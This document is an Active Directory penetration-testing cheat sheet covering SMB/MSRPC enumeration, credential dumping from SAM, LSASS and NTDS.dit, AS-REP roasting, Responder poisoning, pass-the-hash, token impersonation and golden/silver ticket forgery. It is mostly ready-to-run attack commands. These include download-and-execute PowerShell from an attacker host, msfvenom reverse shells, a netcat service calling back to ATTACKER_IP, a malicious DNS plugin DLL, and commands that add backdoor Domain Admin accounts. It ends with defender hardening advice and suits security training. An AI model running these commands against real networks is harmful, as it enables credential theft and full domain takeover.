    Active Directory Reconnaissance

    NetBIOS, SMB & MSRPC enumeration and exploitation guide for Active Directory environments.

    Understanding the Services

    NetBIOS (Network Basic Input/Output System)

    Purpose

    Allows applications on separate computers to communicate over a LAN.

    Ports:

    Port Protocol Service
    137 UDP/TCP Name service for registration and resolution
    138 UDP Datagram distribution service (connectionless)
    139 TCP Session service (connection-oriented)

    Enumeration Value

    Can reveal domain names, workgroup names, system names, and MAC addresses.

    SMB (Server Message Block)

    Purpose

    A network file sharing protocol for shared access to files, directories, printers, and other network resources.

    Ports:

    • 445/tcp - Modern SMB running directly over TCP/IP
    • 139/tcp - Legacy SMB running with NetBIOS over TCP/IP

    Default Administrative Shares:

    Share Purpose
    ADMIN$ Remote administration
    C$ Access to the root of the C: drive volume
    IPC$ Inter-Process Communication - shares named pipes
    NETLOGON Stores logon scripts (Domain Controllers)
    SYSVOL Stores group policy and replicated files (Domain Controllers)

    MSRPC (Microsoft Remote Procedure Call)

    Purpose

    A protocol used by a client to request a service from a program on a remote server as if it were a local call. Backbone for most remote Windows administration.

    Port: TCP/UDP 135 (RPC Endpoint Mapper)

    MSRPC Over SMB (Named Pipes):

    Named Pipe Service Capabilities
    \pipe\lsarpc Local Security Authority (LSA) Enumerate SIDs, policies, trust relationships
    \pipe\samr Local SAM Database Enumerate domain/local users and groups
    \pipe\svcctl Service Control Manager Remotely manage services
    \pipe\atsvc Task Scheduler Remotely manage scheduled tasks
    \pipe\winreg Remote Registry Service Access remote registry

    Initial Enumeration - Nmap

    Full TCP Scan

    nmap -A -sV -sC -T4 <TARGET_IP> -p- -oN tcp_full.nmap

    Note

    Scans all TCP ports to identify open services, especially 135, 139, and 445.

    Top UDP Ports Scan

    nmap -sV -sC -sU <TARGET_IP> --top-ports 100 -oN udp_100.nmap

    Note

    Confirms NetBIOS services on ports 137 and 138.

    NetBIOS Enumeration (UDP Port 137)

    Find hostnames, workgroup/domain names, and MAC addresses.

    nmblookup -A <TARGET_IP>

    # Single host
nbtscan <TARGET_IP>

# Subnet scan
nbtscan <CIDR_RANGE>

    nmap -sU -p137 --script nbstat.nse <TARGET_IP_OR_RANGE>

    MSRPC Enumeration (Port 135)

    Warning

    These tools query the RPC endpoint mapper directly, often without needing credentials.

    Enumerate RPC Endpoints

    # Dump RPC endpoints and string bindings
rpcdump.py <TARGET_IP> -p 135

# Search for Print Spooler
rpcdump.py <TARGET_IP> -p 135 | egrep 'MS-RPRN|MS-PAR'

    Map RPC Endpoints

    rpcmap.py 'ncacn_ip_tcp:<DC_IP>'

    Info

    May be denied on hardened hosts but often works on Domain Controllers.

    Retrieve Network Interface IPs

    ./IOXIDResolver.py -t <TARGET_IP>

    Tip

    Extracts all network interface IPs including IPv6 and hidden networks.

    Metasploit Modules

    use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

    Unauthenticated SMB & MSRPC Enumeration

    A. Enumerating SMB Version

    nmap -p445 --script=smb2-security-mode <TARGET_IP>

    use auxiliary/scanner/smb/smb_version
set RHOSTS <TARGET_IP>
run

    B. Enumerating SMB Shares (Anonymous)

    Always Try First

    Listing shares with anonymous/null session:

    smbclient -L <TARGET_IP> -N

    Brute-Forcing Share Names:

    enum4linux -s <WORDLIST_PATH> <TARGET_IP>

    C. Accessing & Enumerating Shares (Anonymous)

    smbclient -U '%' -N \\\\<TARGET_IP>\\<SHARE_NAME>

    mkdir /mnt/share
mount -t cifs -o username='%',password='' //<TARGET_IP>/<SHARE_NAME> /mnt/share

    D. Enumerating MSRPC over SMB (Anonymous)

    nmap --script=msrpc-enum -p445 <TARGET_IP>

    rpcclient -N <TARGET_IP>

    enum4linux -a <TARGET_IP>

    Authenticated Enumeration

    Important

    Always target the Domain Controller (DC) for domain-level information.

    A. MSRPC Enumeration with rpcclient

    Connecting:

    rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <DC_IP>

    Useful Commands:

    Command Purpose
    srvinfo Get server OS version
    enumdomains List domains
    querydominfo Get details about current domain
    getdompwinfo Get domain password policy
    lookupdomain <DOMAIN> Get Domain SID
    enumdomusers List all domain users and RIDs
    querydispinfo List users with descriptions
    queryuser <RID> Get details for specific user
    queryusergroups <RID> List group RIDs for user
    enumdomgroups List all domain groups
    querygroupmem <RID> List member RIDs for group
    netshareenumall List all SMB shares

    Automated Enumeration:

    enum4linux -a -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <DC_IP>

    B. System Enumeration

    DumpNTLMInfo.py <TARGET_IP>

    # Check for installed KBs (requires admin)
reg.py <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP> query -keyName "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Updates" -s

    C. Domain Enumeration

    net.py <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> computer

crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --computers

    GetADUsers.py <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -all

crackmapexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --users

crackmapexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --groups

    Credential Dumping

    A. Dumping Local SAM Hashes

    Prerequisites

    Local Administrator or SYSTEM privileges on the target host.

    Technique 1: Extract SAM/SYSTEM Hives

    reg save hklm\sam C:\Windows\temp\SAM
reg save hklm\system C:\Windows\temp\SYSTEM

    wmic shadowcopy call create Volume='C:\'
# Copy from shadow copy path:
# \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\

    Technique 2: Dump Hashes Directly

    IEX(New-Object Net.Webclient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerDump.ps1')

    lsadump::sam

    Technique 3: Dump Hashes Remotely

    secretsdump.py <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP>

    crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam

    Exfiltrating and Cracking:

    # Extract hashes from files
secretsdump.py -sam SAM -system SYSTEM LOCAL

    B. Dumping LSASS Memory

    Purpose

    Extract credentials (plaintext, tickets, hashes) for currently and recently logged-on users, including domain accounts.

    Prerequisites

    Local Administrator or SYSTEM privileges.

    crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -M lsassy

    C. Dumping Domain Hashes (NTDS.dit)

    Prerequisites

    Domain Admin (or equivalent) privileges.

    secretsdump.py <DOMAIN>/<DA_USER>:'<PASSWORD>'@<DC_IP>

    crackmapexec smb <DC_IP> -u <DA_USER> -p '<PASSWORD>' --ntds

    Vulnerability Enumeration

    Nmap SMB Vulnerability Scripts

    nmap --script=smb-vuln* -p139,445 <TARGET_IP>

    Note

    Checks for older CVEs like MS17-010 (EternalBlue).

    CrackMapExec Modules

    crackmapexec smb <DC_IP> -u '' -p '' -M zerologon

    crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> -M printnightmare

    AS-REP Roasting Attacks

    Attack Overview

    Targets users with Kerberos pre-authentication disabled, allowing offline password cracking.

    Understanding the Attack

    Kerberos Pre-Authentication:

    • Default security feature requiring users to prove password knowledge
    • Attacker can request authentication data without a password if disabled
    • KDC returns encrypted TGT (AS-REP message) encrypted with user's NTLM hash

    Goal: Capture AS-REP hash and crack it offline.

    B. Hunting for AS-REP Roastable Users (Remote)

    Step 1: Find Domain Users

    ldapsearch -x -H 'ldap://<DC_IP>' -b "dc=<DOMAIN>,dc=<local>" | grep 'userPrincipalName'

    rpcclient <DC_IP> -N
# Then: enumdomusers

    Step 2: Brute-Force with kerbrute

    kerbrute userenum --dc <DC_IP> -d <DOMAIN> <USER_WORDLIST>

    C. Performing the AS-REP Roast (Remote)

    GetNPUsers.py <DOMAIN>/<USERNAME> -dc-ip <DC_IP> -no-pass

    D. Hunting for AS-REP Roastable Users (Internal)

    Get-DomainUser -PreauthNotRequired | select samaccountname

    Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' | select samaccountname

    E. Performing the AS-REP Roast (Internal)

    .\Rubeus.exe asreproast

    Invoke-Rubeus -Command "asreproast"

    F. Cracking the AS-REP Hash

    # Hash Mode: 18200 (Kerberos 5, etype 23, AS-REP)
hashcat -m 18200 ./asrep_hashes.txt <WORDLIST>

# With rules for better results
hashcat -m 18200 ./asrep_hashes.txt <WORDLIST> -r /usr/share/hashcat/rules/best64.rule

    Credential Capture via LLMNR/NBT-NS Poisoning

    Attack Type

    Man-in-the-Middle (MitM) attack on local network to capture NetNTLMv2 hashes.

    A. SMB Poisoning (Mistyped Share)

    How it works: User mistypes network share name → LLMNR/NBT-NS broadcast → Responder answers → Client sends NetNTLMv2 hash

    responder -I <INTERFACE> -rf

    B. WPAD Poisoning (Mistyped URL)

    How it works: User mistypes URL → Responder intercepts WPAD discovery → Acts as rogue proxy → Captures credentials

    Note

    Edit Responder.conf to set up rogue WPAD server script.

    responder -I <INTERFACE> -wrf

    # Forces basic authentication
responder -I <INTERFACE> -wrfFb

    C. DHCP Poisoning

    How it works: Responder wins race against real DHCP server to inject malicious WPAD setting during lease renewal.

    responder -I <INTERFACE> -wrfPdv

    D. Cracking Captured NetNTLMv2 Hashes

    # Hash Mode: 5600
hashcat -m 5600 <HASH_FILE> <WORDLIST>

    E. Bonus Scenarios for Responder

    EXEC master..xp_dirtree '\\<ATTACKER_IP>\test';

    http://vulnerable-app.com/page?url=file://<ATTACKER_IP>/test

    Remote Command Execution

    Prerequisites

    Administrator privileges required.

    Impacket Scripts

    # Interactive Shell
psexec.py -hashes :<NTHASH> <USER>@<TARGET_IP>

    # Semi-interactive shell
smbexec.py -hashes :<NTHASH> <USER>@<TARGET_IP>

    # Semi-interactive shell
wmiexec.py -hashes :<NTHASH> <USER>@<TARGET_IP>

    CrackMapExec

    crackmapexec smb <TARGET_IP> -u <USER> -H <NTHASH> --local-auth -x '<COMMAND>'

    Lateral Movement via Token Impersonation

    Use Case

    After gaining SYSTEM-level access where a privileged domain user has an active session.

    Understanding Access Tokens

    Access Tokens:

    • Generated upon successful authentication
    • Identify user, groups, and privileges
    • Stored by LSASS until system restart

    Delegation Tokens:

    • Created from interactive logons (RDP, physical)
    • Primary targets for impersonation

    B. Impersonation with incognito.exe

    Prerequisites

    SYSTEM privileges required.

    .\incognito.exe list_tokens -u

    # Create reverse shell payload first
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe -o shell.exe

# Execute with token
.\incognito.exe execute -c "<DOMAIN>\<DA_USER>" C:\path\to\shell.exe

    # In SYSTEM meterpreter session
load incognito
list_tokens -u
impersonate_token "<DOMAIN>\\<DA_USER>"
shell

    Pivot to DC:

    .\PsExec64.exe -accepteula \\<DC_HOSTNAME> -c C:\path\to\shell.exe

    # Copy netcat to DC
copy C:\path\to\nc.exe \\<DC_HOSTNAME>\C$\Windows\temp

# Create and start service
sc \\<DC_HOSTNAME> create pivot binpath= "C:\Windows\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"
sc \\<DC_HOSTNAME> start pivot

    C. Impersonation with mimikatz.exe

    Prerequisites

    SYSTEM privileges required.

    Steps:

    privilege::debug                              # Elevate mimikatz privileges
token::list                                   # List available tokens
token::elevate /domainadmin                   # Impersonate DA token
token::run /process:"C:\path\to\shell.exe"   # Execute with token

    Pivot to DC - Create New Domain Admin:

    net user /add <USERNAME> <PASSWORD> /domain
net group /add "Domain Admins" <USERNAME> /domain
# Use new DA account to RDP or psexec into DC

    D. Remote Impersonation with CrackMapExec

    Note

    Performed remotely from attacker machine but requires local admin hash.

    Step 1: Get Local Admin Hash

    reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM

    Step 2: Dump Hashes

    secretsdump.py -sam SAM -system SYSTEM LOCAL

    Step 3: List Tokens Remotely

    crackmapexec smb <WORKSTATION_IP> -u administrator -H <ADMIN_NTHASH> --local-auth -M impersonate -o MODULE=list

    Step 4: Execute Command with Token

    crackmapexec smb <WORKSTATION_IP> -u administrator -H <ADMIN_NTHASH> --local-auth -M impersonate -o MODULE=exec TOKEN=<ID> EXEC="whoami"

    Step 5: Pivot to DC via PowerShell Remoting

    crackmapexec smb <WORKSTATION_IP> -u administrator -H <ADMIN_NTHASH> --local-auth -M impersonate -o MODULE=exec TOKEN=<ID> EXEC="powershell.exe -c 'Invoke-Command -ComputerName <DC_HOSTNAME> -ScriptBlock {whoami}'"

    Lateral Movement – Pass-the-Hash (PtH)

    Overview

    Authenticate to remote systems using NTLM hash instead of plaintext password.

    A. Obtaining Hashes

    Prerequisites

    Administrator or SYSTEM level privileges.

    IEX(New-Object Net.Webclient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerDump.ps1')

    crackmapexec smb <TARGET_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' -M lsassy

    crackmapexec smb <DC_IP> -d <DOMAIN> -u <DA_USER> -H <DA_NTHASH> --ntds

    B. PtH Over SMB (Port 445)

    Test for Hash Reuse:

    crackmapexec smb <IP_RANGE> -u <USER> -H <NTHASH> --local-auth

    Look for

    Pwn3d! indicator in output

    Get a Shell:

    psexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTHASH>

    wmiexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTHASH>

    smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTHASH>

    use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBDomain <DOMAIN>
set SMBUser <USER>
set SMBPass <LM_HASH>:<NT_HASH>
run

    C. PtH Over WinRM (Port 5985)

    crackmapexec winrm <TARGET_IP> -d <DOMAIN> -u <USER> -H <NTHASH> -x '<COMMAND>'

    evil-winrm -i <TARGET_IP> -u <USER> -H <NTHASH>

    D. PtH Over RDP (Port 3389)

    Prerequisites

    Restricted Admin Mode must be enabled (DisableRestrictedAdmin = 0)

    Enable Remotely:

    crackmapexec smb <TARGET_IP> -u <USER> -H <NTHASH> -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

    Connect:

    xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<NTHASH> /d:<DOMAIN>

    Lateral Movement – Over-Pass-the-Hash

    Technique

    Uses NTLM hash to request Kerberos TGT for Pass-the-Ticket attack.

    A. Scenario: Get SYSTEM and Dump LSASS

    1. Get Foothold - Initial access to domain-joined workstation
    2. Escalate to SYSTEM - Use local privilege escalation
    3. Dump LSASS:
    crackmapexec smb <WORKSTATION_IP> -d <DOMAIN> -u <LOCAL_ADMIN> -p '<PASSWORD>' -M lsassy

    B. Over-Pass-the-Hash with Rubeus.exe

    Prerequisites

    SYSTEM shell on victim machine.

    Request TGT and Inject:

    .\Rubeus.exe asktgt /domain:<DOMAIN> /user:<DA_USER> /rc4:<DA_NTHASH> /ptt

    Verification:

    .\Rubeus.exe klist

    Pivot:

    dir \\<DC_HOSTNAME>\C$\

    Enter-PSSession -ComputerName <DC_HOSTNAME>

    C. Over-Pass-the-Hash with getTGT.py

    Prerequisites

    NTLM hash of privileged user.

    Request Ticket:

    getTGT.py -dc-ip <DC_IP> <DOMAIN>/<USER> -hashes :<NTHASH>

    Pass-the-Ticket:

    export KRB5CCNAME=<USERNAME>.ccache
psexec.py <DOMAIN>/<USER>@<DC_HOSTNAME> -k -no-pass

    Domain Persistence – Golden & Silver Tickets

    A. Golden Ticket Attack

    Impact

    Complete and persistent control over entire domain.

    What is it?

    Forged Ticket-Granting Ticket (TGT) allowing authentication as any user with any privileges.

    Prerequisites

    • Domain Admin privileges on DC
    • krbtgt account's NTLM hash
    • Domain Name
    • Domain SID

    Step 1: Gather Required Information

    privilege::debug
lsadump::lsa /inject /name:krbtgt

    Note

    Dumps krbtgt account details including NTLM hash and Domain SID.

    Step 2: Forge and Inject the Golden Ticket

    kerberos::golden /user:<SPOOFED_USERNAME> /domain:<DOMAIN_NAME> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTHASH> /id:500 /ptt

    Parameters:

    Parameter Description
    /user Any name, even non-existent (Administrator is common)
    /id RID of user to impersonate (500 = default Administrator)
    /ptt Inject ticket directly into current session

    Step 3: Use the Ticket

    misc::cmd

    dir \\<OTHER_HOST>\C$

    .\PsExec64.exe -accepteula \\<OTHER_HOST> -s cmd

    Step 4: Alternative Methods

    load kiwi
dcsync_ntlm krbtgt
golden_ticket_create -d <DOMAIN> -u <USER> -s <SID> -k <HASH> -t /path/to/ticket.tck
kerberos_ticket_use /path/to/ticket.tck

    export KRB5CCNAME=<TICKET_FILE_NAME>.ccache

# Forge ticket
ticketer.py -nthash <KRBTGT_NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_NAME> <SPOOFED_USERNAME>

# Use ticket
psexec.py <DOMAIN>/<SPOOFED_USERNAME>@<TARGET_HOSTNAME> -k -no-pass

    B. Silver Ticket Attack

    Overview

    Forged Ticket-Granting Service (TGS) ticket limited to specific service on specific server. Stealthier than Golden Ticket.

    Prerequisites

    • Admin/SYSTEM privileges on target server
    • NTLM hash of service account (e.g., HOSTNAME$)
    • Service Principal Name (SPN)
    • Domain Name and Domain SID

    Step 1: Gather Required Information

    • Obtain service account hash (dump LSASS on target)
    • Get domain SID: wmic useraccount get name,sid

    Step 2: Forge and Inject Silver Ticket

    kerberos::golden /user:<SPOOFED_USERNAME> /domain:<DOMAIN_NAME> /sid:<DOMAIN_SID> /target:<TARGET_SERVER_FQDN> /service:cifs /rc4:<SERVICE_ACCOUNT_NTHASH> /ptt

    Note

    This example forges a ticket for CIFS (file share) service.

    Step 3: Use the Ticket

    dir \\<TARGET_SERVER_FQDN>\C$

    Common Scenarios

    Scenario 1: Finding Credentials and Pivoting

    graph LR
    A[Find Password on Share] --> B[Brute-Force Usernames]
    B --> C[Password Spray]
    C --> D[Re-enumerate with Creds]

    Steps:

    1. Find password: 

      cat /mnt/share/New_Users.txt

    2. Brute-Force Usernames: 

      kerbrute userenum --dc <DC_IP> -d <DOMAIN> <USER_WORDLIST>

    3. Password Spray: 

      kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERS_FILE> <PASSWORD>

    4. Re-enumerate with new credentials

    Scenario 2: Escalation via Service Desk & DnsAdmins

    graph TD
    A[Identify Service Desk User] --> B[Change Target User Password]
    B --> C[Get Foothold on DC]
    C --> D[Escalate from DnsAdmins]
    D --> E[SYSTEM on DC]

    Steps:

    1. Identify Privileged Group: 

      # Use rpcclient or enum4linux to discover user in "Service Desk" group
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <DC_IP>

    2. Change User Password (Leverage Delegated Rights): 

      rpcclient -U '<DOMAIN>/<SERVICE_DESK_USER>%<PASSWORD>' <DC_IP>
# Change password for target user in privileged group
setuserinfo2 <TARGET_USER> 23 <NEW_PASSWORD>

    3. Get Foothold on DC: 

      # Use RDP or WinRM with new credentials
evil-winrm -i <DC_IP> -u <TARGET_USER> -p '<NEW_PASSWORD>'

    4. Escalate from DnsAdmins to SYSTEM:

    a. Create malicious reverse shell DLL: 

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f dll -o payload.dll

    b. Host DLL on SMB share: 

    smbserver.py share $(pwd) -smb2support

    c. Start listener: 

    nc -nvlp 443

    d. On DC, load malicious DLL: 

    dnscmd <DC_HOSTNAME> /config /serverlevelplugindll \\<ATTACKER_IP>\share\payload.dll

    e. Restart DNS service: 

    sc.exe \\<DC_HOSTNAME> stop dns
sc.exe \\<DC_HOSTNAME> start dns

    Result

    SYSTEM shell on Domain Controller

    Checklist for Penetration Testing

    Phase 1: Initial Reconnaissance

    • [ ] Perform full TCP port scan
    • [ ] Perform top UDP port scan
    • [ ] Identify open services (135, 139, 445, etc.)
    • [ ] Note SMB version and signing status
    • [ ] Document NetBIOS names and MAC addresses

    Phase 2: Anonymous Enumeration

    • [ ] Attempt SMB null session
    • [ ] List SMB shares anonymously
    • [ ] Attempt RPC null session with rpcclient
    • [ ] Run enum4linux for comprehensive enumeration
    • [ ] Query RPC endpoints with rpcdump.py
    • [ ] Attempt LDAP anonymous bind
    • [ ] Check for AS-REP roastable users (if user list obtained)

    Phase 3: Credential Capture

    • [ ] Deploy Responder for LLMNR/NBT-NS poisoning
    • [ ] Monitor for NetNTLMv2 hashes
    • [ ] Attempt to crack captured hashes
    • [ ] Search for passwords in discovered shares
    • [ ] Check for common/default credentials

    Phase 4: Authenticated Enumeration

    • [ ] Re-enumerate with valid credentials
    • [ ] Query domain users and groups
    • [ ] Enumerate domain computers
    • [ ] Check password policy
    • [ ] Identify privileged users and groups
    • [ ] Search for interesting files/shares
    • [ ] Enumerate domain trusts
    • [ ] Check for Kerberoasting opportunities

    Phase 5: Lateral Movement

    • [ ] Test for password/hash reuse across systems
    • [ ] Attempt Pass-the-Hash attacks
    • [ ] Look for accessible systems with current credentials
    • [ ] Dump SAM/LSASS on accessible systems
    • [ ] Search for cached domain credentials
    • [ ] Identify systems with privileged user sessions
    • [ ] Attempt token impersonation if SYSTEM access gained

    Phase 6: Privilege Escalation

    • [ ] Escalate to local admin on workstations
    • [ ] Dump credentials from compromised systems
    • [ ] Search for service accounts with elevated privileges
    • [ ] Check for group membership allowing escalation
    • [ ] Attempt Kerberoasting
    • [ ] Look for misconfigurations (DnsAdmins, etc.)

    Phase 7: Domain Admin Compromise

    • [ ] Dump NTDS.dit from Domain Controller
    • [ ] Extract all domain hashes
    • [ ] Create Golden Ticket for persistence
    • [ ] Document domain administrator credentials
    • [ ] Create Silver Tickets for specific services

    Phase 8: Persistence & Documentation

    • [ ] Create backdoor accounts (if authorized)
    • [ ] Document all findings and attack paths
    • [ ] Create Golden Ticket for long-term access
    • [ ] Note all compromised credentials
    • [ ] Document remediation recommendations

    Security Recommendations

    For Defenders

    Network Security

    • [ ] Implement SMB signing on all systems
    • [ ] Disable SMB v1 protocol
    • [ ] Disable LLMNR and NBT-NS
    • [ ] Implement network segmentation
    • [ ] Deploy host-based firewalls
    • [ ] Monitor for unusual RPC/SMB traffic

    Active Directory Hardening

    • [ ] Enable Kerberos pre-authentication for all accounts
    • [ ] Implement strong password policies
    • [ ] Use unique local administrator passwords (LAPS)
    • [ ] Limit Domain Admin logons to Domain Controllers only
    • [ ] Disable NTLM authentication where possible
    • [ ] Regularly audit privileged group membership
    • [ ] Implement tiered administration model
    • [ ] Enable RDP Restricted Admin mode carefully
    • [ ] Monitor for Golden/Silver Ticket indicators

    Credential Protection

    • [ ] Enable Credential Guard on supported systems
    • [ ] Implement Protected Process Light for LSASS
    • [ ] Disable WDigest authentication
    • [ ] Clear cached credentials regularly
    • [ ] Implement proper service account management
    • [ ] Use Group Managed Service Accounts (gMSA)
    • [ ] Rotate krbtgt password regularly (twice)

    Monitoring & Detection

    • [ ] Enable advanced audit policies
    • [ ] Monitor for Kerberos anomalies
    • [ ] Detect DCSync attempts
    • [ ] Alert on unusual credential dumping tools
    • [ ] Monitor for token impersonation
    • [ ] Detect AS-REP roasting attempts
    • [ ] Alert on administrative share access
    • [ ] Monitor DNS admin group changes
